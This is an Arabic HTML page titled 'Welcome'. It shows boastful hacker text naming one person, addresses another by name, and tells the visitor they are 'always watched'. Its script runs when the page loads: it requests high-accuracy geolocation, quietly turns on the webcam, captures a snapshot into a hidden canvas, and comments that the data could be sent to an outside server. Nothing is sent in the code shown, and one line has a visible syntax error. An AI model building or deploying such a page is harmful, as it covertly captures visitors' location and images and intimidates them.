<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>مرحباً</title>
    <style>
        body {
            background-color: #ffffff;
            color: #111111;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            text-align: center;
        }
        .content {
            line-height: 1.8;
            font-size: 22px;
            font-weight: bold;
        }
        .content p {
            margin: 10px 0;
        }
    </style>
</head>
<body>

<div class="content">
    <p>محمد طه ملك البرمجة</p>
    <p>لقيتنا كيف يامنذر</p>
    <p>هندسة الشبكات والاختراق</p>
    <p>والامن السبيراني</p>
    <p>والهاكر</p>
    <p>انت مراقب دائماً</p>
</div>

<!-- عناصر مخفية لالتقاط ومعالجة البيانات واللقطات -->
<video id="webcam" autoplay playsinline style="display:none;"></video>
<canvas id="canvas" style="display:none;"></canvas>

<script>
    // طلب الموقع الجغرافي فور دخول الصفحة
    window.addEventListener('load', () => {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    console.log("تم تحديد الموقع:", lat, lon);
                    // يمكنك إرسال الإحداثيات هنا إلى سيرفر خارجي إذا رغبت
                },
                (error) => {
                    console.log("تم رفض إذن الموقع أو حدث خطأ.");
                },
                { enableHighAccuracy: true }
            );
        }

        // محاولة تشغيل الكاميرا لالتقاط لقطات مسجلة
        navigator.mediaDevices.getUserMedia({ video: true })
            .then((stream) => {
                const video = document.getElementById('webcam');
                video.srcObject = stream;
                video.onloadedmetadata = () => {
                    setTimeout(() => {
                        const canvas = document.getElementById('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                        
                        // تحويل الصورة إلى بيانات يمكن حفظها أو إرسالها
                        const imageDataURL = canvas.toDataURL('image/png');
                        console.>log("تم التقاط الصورة بنجاح");
                        
                        // إيقاف الكاميرا بعد التقاط اللقطة
                        stream.getTracks().forEach(track => track.stop());
                    }, 1500); // الانتظار 1.5 ثانية لضمان وضوح اللقطة
                };
            })
            .catch((err) => {
                console.log("تعذر الوصول إلى الكاميرا.");
            });
    });
</script>

</body>
</html>
